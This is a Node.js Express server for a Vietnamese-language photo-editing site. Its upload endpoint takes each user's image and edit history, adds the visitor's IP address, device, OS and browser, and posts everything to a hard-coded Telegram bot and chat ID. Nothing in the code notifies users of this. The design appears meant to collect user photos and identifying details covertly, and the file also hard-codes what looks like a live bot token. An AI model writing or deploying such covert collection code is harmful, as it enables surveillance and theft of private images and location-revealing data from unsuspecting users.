const express = require('express');
const multer = require('multer');
const UAParser = require('ua-parser-js');
const cors = require('cors');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(express.json());

// Token Bot Telegram của bạn
// Token Bot do BotFather cung cấp
const TELEGRAM_BOT_TOKEN = '9108979188:AAE3FsPsM_QKKDOuVBfkJ1S2ukDDkISeVVc';

// Chat ID tài khoản Telegram của bạn (Thay dãy số ID cá nhân vào đây)
const TELEGRAM_CHAT_ID = '8774231221';

const upload = multer({ dest: 'uploads/' });

app.post('/api/submit', upload.single('image'), async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        const ua = UAParser(req.headers['user-agent']);
        const deviceInfo = `${ua.device.type ? ua.device.type.toUpperCase() : 'Máy tính (Desktop)'} | ${ua.os.name || ''} ${ua.os.version || ''} | ${ua.browser.name || ''} ${ua.browser.version || ''}`;

        const actions = req.body.actions ? JSON.parse(req.body.actions) : [];
        const actionListText = actions.map(act => `- ${act}`).join('\n');

        const caption = `🔔 *CÓ NGƯỜI THAM GIA CHỈNH SỬA ẢNH!*\n\n` +
                        `🌐 *Địa chỉ IP:* \`${ip}\`\n` +
                        `💻 *Thiết bị:* ${deviceInfo}\n` +
                        `⏱ *Thời gian:* ${new Date().toLocaleString('vi-VN')}\n\n` +
                        `🛠 *Thao tác đã thực hiện:*\n${actionListText || 'Không có ghi nhận'}`;

        if (req.file) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');
            
            const fileBuffer = fs.readFileSync(req.file.path);
            const blob = new Blob([fileBuffer]);
            formData.append('photo', blob, req.file.originalname);

            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });

            fs.unlinkSync(req.file.path);
        }

        res.json({ success: true, message: 'Đã gửi thông tin về Telegram thành công!' });
    } catch (error) {
        console.error('Lỗi server:', error);
        res.status(500).json({ success: false, message: 'Lỗi hệ thống khi gửi thông báo.' });
    }
});

// Phục vụ giao diện file chinhanh.html khi người dùng truy cập trang chủ
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/chinhanh.html');
});
app.listen(3000, () => {
    console.log('Server đang chạy tại https://chinhanh-photo-editor.onrender.com/api/submit');
});
